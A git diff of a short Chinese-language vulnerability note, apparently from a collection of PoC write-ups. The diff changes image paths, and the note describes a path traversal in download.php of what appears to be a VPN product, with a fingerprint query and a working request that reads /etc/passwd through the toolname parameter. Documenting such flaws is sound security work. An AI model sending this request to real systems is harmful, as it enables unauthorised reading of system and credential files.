@@ -20,18 +20,16 @@ body="Get_Verify_Info(hex_md5(user_string)."
 
 登录页面如下
 
-![](images/202202162251851.png)
+![](../.gitbook/assets/202202162251851.png)
 
 漏洞存在于 download.php
 
-![](images/202202162251009.png)
-
-
+![](../.gitbook/assets/202202162251009.png)
 
 任意点击后抓包，更改 **toolname** 参数
 
-```plain
+```
 /download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
 ```
 
-![](images/202202162251674.png)
+![](../.gitbook/assets/202202162251674.png)
